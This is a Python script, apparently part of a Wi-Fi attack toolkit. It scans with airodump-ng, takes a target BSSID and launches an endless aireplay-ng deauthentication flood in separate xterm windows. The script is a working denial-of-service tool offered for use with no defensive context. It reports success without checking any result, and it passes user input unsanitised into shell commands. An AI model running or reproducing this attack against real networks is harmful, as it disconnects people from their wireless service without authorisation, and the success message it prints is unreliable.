import os 
import time
import banners as br



def StartDeauthAttack():
    APinterface="eth0"
    APtargetBssid = ""
    br.Banner4()

    try:

        APinterface = input("Network card that should be used as deauthenticator \>>")
        if APinterface == '':
            APinterface = "eth0"
        
        while True:
            os.system(f"airodump-ng {APinterface}")
            APtargetBssid = input("Enter the targets bssid (Write the targets bssid and essid somewhere! maybe notepad) \>>")
            if APtargetBssid == "":
                print("Please enter a Targets Adress(Mac adress)")
                time.sleep(3)
                continue
            else:
                break

        os.system(f"xterm -bg black -fg white -hold -e 'aireplay-ng -0 0 -a {APtargetBssid} {APinterface}' &" )
        os.system(f"xterm -bg black -fg white -hold -e 'airmon-ng  -b {APtargetBssid} {APinterface}' &" )

        print("Starting Deautattack...")
        print("Deauthenticating Target Successfully")
        time.sleep(1)
        os.system("clear")
        while True:
            os.system("clear")
            br.Banner4()
            try:
                print("Press Ctrl + C to stop the attack")
            except KeyboardInterrupt:
                break
            time.sleep(1)

    except KeyboardInterrupt:
        pass